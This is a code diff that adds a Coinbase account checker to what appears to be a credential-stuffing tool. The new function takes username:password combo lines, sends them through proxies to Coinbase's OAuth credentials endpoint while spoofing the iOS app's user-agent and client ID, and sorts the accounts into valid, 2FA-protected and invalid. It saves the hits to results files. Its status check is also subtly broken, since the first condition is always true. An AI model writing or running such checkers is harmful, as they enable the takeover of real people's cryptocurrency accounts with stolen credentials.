@@ -18,7 +18,28 @@ except :
   system('pip install time')
   import time
   from time import sleep
+def coinbase(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'CoinbasePro/1.0.85 (com.coinbase.pro; build:1008501; iOS 15.0)',
+      }
+  )
+  url = 'https://api.coinbase.com/oauth/authorize/with-credentials'
+  data ={"client_id":"2d06b9a69c15e183856ff52c250281f6d93f9abef819921eac0d8647bb2b61f9","password":y,"username":x}
 
+  r = requests.post(url, json=data, proxies=proxy,headers=headers)
+  if 'param_required' or 'incorrect_credentials' in r.text:
+    status = 'false'
+  elif 'success' in r.text:
+    status = 'true'
+  elif '2fa_required' in r.text:
+    status = '2fa'
+  else :
+    status = 'false'
+  return status
 def picstart(combo,proxy):
   
   x,y = combo.split(":", 1)
@@ -136,8 +157,17 @@ def combo_loader():
       if isdir == False :
         os.mkdir('results')
       f = open('results/valid.txt','a+')
-      f.write(x+ '\n')
-    if output == 'false' : 
+      accountwrite = (x+'\n')
+      f.write(accountwrite)
+    elif output == '2fa':
+      print('2fa : '+ x ) 
+      isdir = os.path.isdir('results')
+      if isdir == False :
+        os.mkdir('results')
+      f = open('results/2fa.txt','a+')
+      accountwrite = (x+'\n')
+      f.write(accountwrite)
+    elif output == 'false' : 
       print('invalid ' + x) 
     else:
       print(output)
